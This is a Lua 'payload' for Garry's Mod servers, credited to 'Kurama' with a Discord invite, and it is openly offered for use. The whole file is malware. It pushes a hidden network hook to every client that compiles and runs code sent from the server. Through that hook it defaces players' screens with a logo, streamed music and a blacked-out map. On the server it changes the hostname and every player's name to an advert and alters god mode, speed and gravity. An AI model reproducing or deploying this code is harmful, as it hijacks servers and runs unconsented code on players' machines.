-- Payload Created by Kurama

-- Sinking SSV

-- Modification No Autorised

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function file.Write() return end
local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end
 
local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "BestLol"..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)
 
local function InfoClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

-- Font
timer.Simple(2 ,function()
InfoClient([=[
local WriteK = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "DevMod", {
    font = "Roboto",
    extended = false,
    size = WriteK *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
})

hook.Add( "HUDPaint", "Font1", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Kurama", "DevMod", ScrW() /2, ScrH() /2,Color( 0, 0, 0),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 255, 255, 255))
local mat = Entity(0):GetMaterials()
    for k,v in pairs(mat) do
    end
end)
]=])
end)

-- Song
timer.Simple(2 ,function()
InfoClient([=[
local AudioSource = nil
local AMP = 3000

sound.PlayURL("https://cdn.kurama.info/songs/Sinking.mp3", "mono", function(source , err , errname)
    if IsValid(source) then
        AudioSource = source
        source:Play()
    end
end)

local smoothdata = {}
local SoundPlay = 0

for i = 1 , 256 do
    smoothdata[i] = 0
end

hook.Add("HUDPaint" , "VisualizerIsHere" , function()
local data = {}
    AudioSource:FFT(data , FFT_5000)
    for i = 65 , 125 do
        smoothdata [i] = Lerp(5 * FrameTime() , smoothdata[i] , data[i])
        SoundPlay = SoundPlay + smoothdata [i]
        draw.RoundedBox (1000 , i * 10 , 600 , 5 , smoothdata[i] * AMP , Color( 255, 255, 255))
    end
end)

function MyCalcView( ply, pos, angles, fov )
local view = {}
    view.origin = pos
    view.angles = angles
    view.fov = fov + ( SoundPlay * 100 )
    return view
end

hook.Add("CalcView", "CalcView", MyCalcView)

]=])
end)

-- SkyBox
timer.Simple(2 ,function()
InfoClient([=[
    function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 0, 0, 0)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
    function GAMEMODE:PreDrawSkyBox()
local col = Color( 0, 0, 0)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

-- Color Map
timer.Simple(2 ,function()
InfoClient([=[
local MapCustom = {}
    hook.Add("HUDPaint", "Black",function()
        for k,v in pairs(MapCustom) do
        v()
    end
end)

MapCustom["CoolEffect"] = function()
local mats = Entity(0):GetMaterials()
    for k,v in pairs(mats) do
local BlackMap = Color( 0, 0, 0)
        Material(v):SetVector("$color", Vector(BlackMap))
        Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
    end
end
]=])
end)

-- Custom Settings
timer.Simple(2 ,function()
    RunConsoleCommand("hostname", "Server has been Event by Kurama -> discord.gg/kurama !")
    RunConsoleCommand("ulx", "god", "*")
end)

timer.Create("ChangeRPName",2 ,99 , function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar("rpname", "Server has been Event by Kurama -> discord.gg/kurama !")
    end
end)

timer.Create("Speed",16 ,1 , function()
    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(400 * 4);
    end
end)

timer.Simple(41 ,function()
    RunConsoleCommand("sv_gravity", "150")
end)
